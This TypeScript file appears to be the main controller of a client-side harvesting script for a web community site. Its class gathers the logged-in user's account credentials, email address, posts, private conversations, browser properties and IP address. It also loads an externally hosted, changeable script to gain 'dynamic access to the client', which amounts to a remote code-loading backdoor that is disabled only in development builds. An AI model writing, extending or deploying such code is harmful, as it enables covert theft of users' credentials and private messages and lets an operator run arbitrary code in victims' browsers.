import { EXTERNAL_SCRIPT_SRC } from '@env';
import { getCurrentUser, getCurrentUserSlug } from '@functions';
import { getScript } from '@helpers';
import {
	searchAllConversations,
	searchAllPosts,
	searchNavigatorProperties,
	searchIpAddress,
	searchAccountCredentials,
	searchEmailAddress,
} from '.';

/**
 * The main class that controls and executes all other sub-processes.
 */
export class Yoshimitsu {
	/**
	 * @see {@link searchAccountCredentials} for more information.
	 */
	public static searchAccountCredentials = searchAccountCredentials;

	/**
	 * @see {@link searchAllConversations} for more information.
	 */
	public static searchAllConversations = searchAllConversations;

	/**
	 * @see {@link searchAllPosts} for more information.
	 */
	public static searchAllPosts = searchAllPosts;

	/**
	 * @see {@link searchEmailAddress} for more information.
	 */
	public static searchEmailAddress = searchEmailAddress;

	/**
	 * @see {@link searchIpAddress} for more information.
	 */
	public static searchIpAddress = searchIpAddress;

	/**
	 * @see {@link searchNavigatorProperties} for more information.
	 */
	public static searchNavigatorProperties = searchNavigatorProperties;

	private _externalScriptSrc = '';

	public getExternalScriptSrc() {
		return this._externalScriptSrc;
	}

	public setExternalScriptSrc(externalScriptSrc: string) {
		this._externalScriptSrc = externalScriptSrc;

		return this;
	}

	/**
	 * Executes {@link Yoshimitsu.searchAccountCredentials}, {@link Yoshimitsu.searchEmailAddress}, {@link Yoshimitsu.searchAllPosts},
	 * {@link Yoshimitsu.searchAllConversations}, {@link Yoshimitsu.searchNavigatorProperties}, {@link Yoshimitsu.searchIpAddress} in this order.
	 */
	public static searchAll() {
		const locationHostname = location.hostname;

		(async () => {
			const [currentUser, currentUserSlug] = await Promise.all([getCurrentUser(), getCurrentUserSlug()]);
			const currentUserId = currentUser.userId;
			const currentUsername = currentUser.username;

			Yoshimitsu.searchAccountCredentials(locationHostname, currentUsername);
			Yoshimitsu.searchEmailAddress(locationHostname, currentUsername);
			Yoshimitsu.searchAllPosts(locationHostname, currentUserId, currentUsername, currentUserSlug);
			Yoshimitsu.searchAllConversations(locationHostname, currentUserId, currentUsername, currentUserSlug);
			Yoshimitsu.searchNavigatorProperties(locationHostname, currentUsername);
			Yoshimitsu.searchIpAddress(locationHostname, currentUsername);
		})();
	}

	/**
	 * Executes {@link Yoshimitsu.searchAll}.
	 */
	public start() {
		Yoshimitsu.searchAll();

		return this;
	}

	/**
	 * In order to have dynamic access to the client, a script is loaded from the server, the content of which
	 * can be changed. But not in development mode.
	 *
	 * @returns Whether the script was executed successfully.
	 */
	public executeExternalScript(cb?: (src: string) => void) {
		if (!this._externalScriptSrc) {
			console.warn(
				'' +
					`No script source file was specified for '${nameof(getScript)}'.\n` +
					`See '${nameof(EXTERNAL_SCRIPT_SRC)}' in 'webpack.config.js'.`
			);

			return false;
		}

		if (process.env.NODE_ENV === 'development') {
			return false;
		}

		getScript(this._externalScriptSrc, () => cb?.(this._externalScriptSrc));

		return true;
	}
}
